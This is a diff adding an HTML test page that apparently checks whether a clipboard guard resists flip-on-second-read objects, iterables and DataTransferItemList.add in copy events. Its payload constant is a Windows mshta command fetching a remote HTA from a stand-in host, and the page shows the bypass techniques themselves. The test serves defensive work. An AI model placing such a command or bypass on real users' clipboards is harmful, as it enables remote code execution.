@@ -1,0 +1,39 @@
+<!doctype html><meta charset="utf-8"><title>TOCTOU and DataTransferItemList clipboard</title>
+<body><button id="go">go</button>
+<script>
+// Adversarial: objects whose toString() is benign the first time and hostile the second, plus
+// DataTransferItemList.add(string) inside a copy event. Nothing here may reach the clipboard.
+const EVIL = 'mshta https://evil.test/verify.hta';
+const r = (window.__result = {});
+const flip = () => { let n = 0; return { toString() { return n++ ? EVIL : 'hello'; } }; };
+document.getElementById('go').addEventListener('click', async () => {
+  await navigator.clipboard.writeText('sentinel');
+  r.writeText = await navigator.clipboard.writeText(flip()).then(() => 'ok', e => 'rejected:' + e.name);
+  r.afterWriteText = await navigator.clipboard.readText().catch(e => 'readfail:' + e.name);
+  // ClipboardItem path: array whose iteration differs on the second pass
+  const good = new ClipboardItem({ 'text/plain': new Blob(['hello'], { type: 'text/plain' }) });
+  const bad = new ClipboardItem({ 'text/plain': new Blob([EVIL], { type: 'text/plain' }) });
+  let pass = 0;
+  const itemsFlip = { [Symbol.iterator]() { return (pass++ ? [bad] : [good])[Symbol.iterator](); } };
+  r.write = await navigator.clipboard.write(itemsFlip).then(() => 'ok', e => 'rejected:' + e.name);
+  r.afterWrite = await navigator.clipboard.readText().catch(e => 'readfail:' + e.name);
+  await navigator.clipboard.writeText('sentinel');
+  // setData with a flipping type and flipping data inside a copy event
+  document.addEventListener('copy', e => {
+    r.setDataStored = (e.clipboardData.setData('text/plain', flip()), e.clipboardData.getData('text/plain'));
+    e.preventDefault();
+  }, { once: true });
+  r.copy1 = document.execCommand('copy');
+  r.afterSetData = await navigator.clipboard.readText().catch(e => 'readfail:' + e.name);
+  await navigator.clipboard.writeText('sentinel');
+  // DataTransferItemList.add(string, type)
+  document.addEventListener('copy', e => {
+    r.addResult = e.clipboardData.items.add(EVIL, 'text/plain');
+    r.addStored = e.clipboardData.getData('text/plain');
+    e.preventDefault();
+  }, { once: true });
+  r.copy2 = document.execCommand('copy');
+  r.afterAdd = await navigator.clipboard.readText().catch(e => 'readfail:' + e.name);
+  window.__done = true;
+});
+</script>
